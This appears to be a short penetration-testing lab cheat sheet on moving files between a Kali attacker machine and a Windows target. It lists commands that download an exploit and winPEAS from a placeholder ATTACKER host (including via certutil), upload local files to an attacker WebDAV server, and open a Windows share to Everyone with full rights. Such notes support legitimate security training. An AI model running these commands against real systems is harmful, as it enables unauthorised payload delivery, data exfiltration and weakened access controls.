From Kali to Windows
- Launch Webdav on kali -> 
```
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/...
```

- Power shell to grab file-> 
```
Invoke-WebRequest -Uri "http://ATTACKER/syncbreeze_exploit.exe" -OutFile "C:\Users\student\Downloads\syncbreeze_exploit.exe"
```


From Windows to Kali
	in PowerShell define these variables 
```
$filePath = "C:\Path\To\Your\File.ext"
```

```
$destinationURL = "http://ATTACKER/webdav"
```
	
```
Invoke-WebRequest -Uri $destinationURL -Method PUT -InFile $filePath
```
```
Invoke-WebRequest -Uri $destinationURL -Method POST -InFile $filePath
```

***use POST if PUT doesn't work***
***it will rename the file to Webdav, just change the name with mv***

Using SCP ->
on kali 
```
sudo service ssh restart
```

on windows machine 
```
scp /path/to/local/file username@linux-server:/path/to/destination
```

as a alternative for SCP ->
```
pscp -r C:\local\file\path username@linux-server:/remote/destination/path
```

From kali to Powershell
on kali
```
systemctl start apache2
```

in Powershell
```
certutil.exe -urlcache -f -split "http://ATTACKER/winPEASx86.exe"
```

To host a share in cmd ->
```
net share public=c:\users\Public /GRANT:Everyone,FULL
```

![[capture1.png]]